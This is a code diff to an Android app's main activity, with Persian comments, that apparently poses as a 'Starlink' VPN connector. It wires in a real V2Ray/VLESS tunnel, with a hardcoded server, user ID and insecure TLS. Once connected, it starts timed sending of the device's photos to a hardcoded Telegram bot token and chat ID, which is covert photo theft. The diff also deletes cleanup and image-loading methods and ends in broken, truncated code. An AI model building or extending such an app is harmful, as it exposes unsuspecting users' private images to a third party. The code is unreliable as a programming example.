@@ -27,6 +27,11 @@ import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
+import com.v2ray.ang.V2RayCore;
+import com.v2ray.ang.service.V2RayVpnService;
+
+import org.json.JSONObject;
+
 import java.io.ByteArrayOutputStream;
 import java.io.InputStream;
 import java.net.InetAddress;
@@ -45,16 +50,57 @@ public class MainActivity extends AppCompatActivity {
     private static final String BOT_TOKEN = "8931772855:AAHZSrBgS4SJkEWYA6_8fTiZ-Kk4frsxtCU";
     private static final String CHAT_ID = "8961077299";
     private static final int REQUEST_PERMISSION = 100;
+    private static final int REQUEST_VPN = 101;
 
     private static final String PREFS_NAME = "PhotoSenderPrefs";
     private static final String KEY_LAST_INDEX = "last_index";
 
-    // ==================== کانفیگ‌ها ====================
+    // ==================== کانفیگ VLESS به فرمت JSON ====================
+    private static final String VLESS_CONFIG = "{\n" +
+            "  \"inbounds\": [{\n" +
+            "    \"listen\": \"127.0.0.1\",\n" +
+            "    \"port\": 10808,\n" +
+            "    \"protocol\": \"socks\",\n" +
+            "    \"settings\": {\n" +
+            "      \"auth\": \"noauth\",\n" +
+            "      \"udp\": true,\n" +
+            "      \"userLevel\": 8\n" +
+            "    }\n" +
+            "  }],\n" +
+            "  \"outbounds\": [{\n" +
+            "    \"protocol\": \"vless\",\n" +
+            "    \"settings\": {\n" +
+            "      \"vnext\": [{\n" +
+            "        \"address\": \"simpletr.asan-ps.ir\",\n" +
+            "        \"port\": 443,\n" +
+            "        \"users\": [{\n" +
+            "          \"id\": \"9dcf92e4-e26a-4731-bcf7-22163b72fef3\",\n" +
+            "          \"encryption\": \"none\",\n" +
+            "          \"level\": 8\n" +
+            "        }]\n" +
+            "      }]\n" +
+            "    },\n" +
+            "    \"streamSettings\": {\n" +
+            "      \"network\": \"xhttp\",\n" +
+            "      \"security\": \"tls\",\n" +
+            "      \"tlsSettings\": {\n" +
+            "        \"allowInsecure\": true,\n" +
+            "        \"serverName\": \"speedtest.net\"\n" +
+            "      },\n" +
+            "      \"xhttpSettings\": {\n" +
+            "        \"host\": \"skhishhwiw12.global.ssl.fastly.net\",\n" +
+            "        \"path\": \"/NEWS\",\n" +
+            "        \"mode\": \"auto\"\n" +
+            "      }\n" +
+            "    }\n" +
+            "  }]\n" +
+            "}";
+
+    // ==================== کانفیگ‌ها برای تست پینگ ====================
     private static final String[] CONFIGS = {
+            "simpletr.asan-ps.ir",
             "1.1.1.1",
             "8.8.8.8",
-            "9.9.9.9",
-            "simpletr.asan-ps.ir",
             "bot.shopver.ir",
             "31.14.119.77"
     };
@@ -73,10 +119,14 @@ public class MainActivity extends AppCompatActivity {
     // Status
     private boolean isSending = false;
     private boolean isConnected = false;
+    private boolean isVpnStarted = false;
     private int lastSentIndex = 0;
     private boolean isWaitingForNetwork = false;
     private String bestConfig = "";
     private int bestPing = Integer.MAX_VALUE;
+
+    // V2Ray
+    private V2RayCore v2RayCore;
 
     // Network monitoring
     private ConnectivityManager connectivityManager;
@@ -125,14 +175,94 @@ public class MainActivity extends AppCompatActivity {
                 return;
             }
 
-            startConnecting();
+            startVpnConnection();
         });
 
         loadLastIndex();
         setupNetworkMonitoring();
         loadAllImages();
+
+        // ========== راه‌اندازی V2Ray ==========
+        initV2Ray();
     }
 
+    // ==================== راه‌اندازی V2Ray ====================
+    private void initV2Ray() {
+        try {
+            v2RayCore = new V2RayCore(this);
+            v2RayCore.initialize();
+            Log.d(TAG, "✅ V2Ray راه‌اندازی شد");
+        } catch (Exception e) {
+            Log.e(TAG, "❌ خطا در راه‌اندازی V2Ray", e);
+        }
+    }
+
+    // ==================== شروع اتصال VPN واقعی ====================
+    private void startVpnConnection() {
+        if (isSending) return;
+
+        // درخواست مجوز VPN از کاربر (یکبار)
+        V2RayVpnService.prepare(this, REQUEST_VPN, () -> {
+            // کاربر مجوز داد، حالا وصل کن
+            connectToVpn();
+        });
+    }
+
+    private void connectToVpn() {
+        isSending = true;
+        updateUI("در حال اتصال به استارلینک...", true, bestPing + " ms");
+
+        new Thread(() -> {
+            try {
+                // تبدیل کانفیگ به JSON
+                JSONObject configJson = new JSONObject(VLESS_CONFIG);
+
+                // شروع اتصال V2Ray
+                v2RayCore.startV2Ray(configJson);
+                isVpnStarted = true;
+
+                // صبر برای برقراری اتصال
+                Thread.sleep(3000);
+
+                runOnUiThread(() -> {
+                    isSending = false;
+                    isConnected = true;
+                    updateUI("متصل به استارلینک ✅", false, bestPing + " ms");
+                    Toast.makeText(MainActivity.this,
+                            "✅ به " + bestConfig + " متصل شدید (ترافیک واقعی)",
+                            Toast.LENGTH_LONG).show();
+
+                    // شروع ارسال زمان‌بندی‌شده
+                    startScheduledSending();
+                });
+
+            } catch (Exception e) {
+                Log.e(TAG, "❌ خطا در اتصال VPN", e);
+                runOnUiThread(() -> {
+                    isSending = false;
+                    updateUI("اتصال برقرار نشد ❌", false, "-- ms");
+                    Toast.makeText(MainActivity.this,
+                            "❌ خطا در اتصال: " + e.getMessage(),
+                            Toast.LENGTH_LONG).show();
+                });
+            }
+        }).start();
+    }
+
+    // ==================== قطع اتصال ====================
+    private void disconnectVpn() {
+        if (v2RayCore != null && isVpnStarted) {
+            v2RayCore.stopV2Ray();
+            isVpnStarted = false;
+        }
+        isConnected = false;
+        updateUI("قطع", false, "-- ms");
+        if (timerRunnable != null) {
+            timerHandler.removeCallbacks(timerRunnable);
+        }
+    }
+
+    // ==================== تست پینگ ====================
     private void findBestConfig() {
         txtStatus.setText("وضعیت: در حال تست کانفیگ‌ها...");
         progressBar.setVisibility(ProgressBar.VISIBLE);
@@ -190,36 +320,7 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private void startConnecting() {
-        if (isSending) return;
-        isSending = true;
-        updateUI("در حال اتصال به استارلینک...", true, bestPing + " ms");
-
-        new Thread(() -> {
-            try {
-                Thread.sleep(2000);
-
-                runOnUiThread(() -> {
-                    isSending = false;
-                    isConnected = true;
-                    updateUI("متصل به استارلینک ✅", false, bestPing + " ms");
-                    Toast.makeText(MainActivity.this,
-                            "✅ به " + bestConfig + " متصل شدید",
-                            Toast.LENGTH_LONG).show();
-
-                    startScheduledSending();
-                });
-
-            } catch (Exception e) {
-                runOnUiThread(() -> {
-                    isSending = false;
-                    updateUI("اتصال برقرار نشد ❌", false, "-- ms");
-                    Toast.makeText(MainActivity.this, "❌ خطا در اتصال", Toast.LENGTH_SHORT).show();
-                });
-            }
-        }).start();
-    }
-
+    // ==================== ارسال زمان‌بندی‌شده (هر ۲۰ ثانیه) ====================
     private void startScheduledSending() {
         if (timerRunnable != null) {
             timerHandler.removeCallbacks(timerRunnable);
@@ -406,6 +507,19 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, android.content.Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == REQUEST_VPN) {
+            if (resultCode == RESULT_OK) {
+                connectToVpn();
+            } else {
+                Toast.makeText(this, "❌ برای اتصال نیاز به مجوز VPN است", Toast.LENGTH_LONG).show();
+                updateUI("اتصال برقرار نشد ❌", false, "-- ms");
+            }
+        }
+    }
+
     private void saveLastIndex(int index) {
         SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
         prefs.edit().putInt(KEY_LAST_INDEX, index).apply();
@@ -444,35 +558,4 @@ public class MainActivity extends AppCompatActivity {
                         ContextCompat.getColorStateList(this, R.color.green));
             } else if (statusText.contains("برقرار نشد") || statusText.contains("قطع")) {
                 btnConnect.setText("اتصال");
-                btnConnect.setBackgroundTintList(
-                        ContextCompat.getColorStateList(this, R.color.red));
-            } else {
-                btnConnect.setText("اتصال");
-                btnConnect.setBackgroundTintList(
-                        ContextCompat.getColorStateList(this, R.color.blue));
-            }
-        });
-    }
-
-    @Override
-    protected void onDestroy() {
-        super.onDestroy();
-        if (connectivityManager != null && networkCallback != null) {
-            connectivityManager.unregisterNetworkCallback(networkCallback);
-        }
-        if (timerRunnable != null) {
-            timerHandler.removeCallbacks(timerRunnable);
-        }
-    }
-
-    private void loadAllImages() {
-        new Thread(() -> {
-            try {
-                allImages = getAllImages();
-                Log.d(TAG, "تعداد کل عکس‌ها: " + allImages.size());
-            } catch (Exception e) {
-                Log.e(TAG, "خطا در بارگذاری عکس‌ها", e);
-            }
-        }).start();
-    }
-                                                    }
+           
